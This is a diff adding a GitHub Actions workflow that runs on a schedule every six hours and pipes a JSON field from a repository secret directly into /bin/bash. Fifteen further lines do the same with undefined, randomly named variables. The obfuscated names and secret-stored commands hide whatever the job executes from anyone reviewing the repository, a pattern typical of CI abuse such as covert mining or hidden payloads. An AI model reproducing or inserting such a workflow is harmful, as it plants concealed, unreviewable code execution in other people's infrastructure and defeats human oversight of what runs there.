@@ -1,0 +1,32 @@
+name: errenjieshinali
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: errenjieshinali
+        env:
+          nt653: ${{ secrets.nt653 }}
+        run: |
+          echo $nt653 | jq -r .unxrl63 | /bin/bash
+          echo $dnese760 | jq -r .chka73284 | /bin/bash
+          echo $ak72438 | jq -r .fcwbf8 | /bin/bash
+          echo $m07852 | jq -r .r84033 | /bin/bash
+          echo $zhah99 | jq -r .ofrs1 | /bin/bash
+          echo $aaew62732 | jq -r .uzea4370 | /bin/bash
+          echo $au94923 | jq -r .lww8 | /bin/bash
+          echo $s6100 | jq -r .w931 | /bin/bash
+          echo $xnx482 | jq -r .slgxh222 | /bin/bash
+          echo $ym306 | jq -r .x5918 | /bin/bash
+          echo $a062 | jq -r .bs5310 | /bin/bash
+          echo $f8 | jq -r .eqek48 | /bin/bash
+          echo $pc6 | jq -r .qz63 | /bin/bash
+          echo $fyizk12762 | jq -r .i532 | /bin/bash
+          echo $p03509 | jq -r .dh219 | /bin/bash
+          echo $yfiu8 | jq -r .lpoxg450 | /bin/bash
+
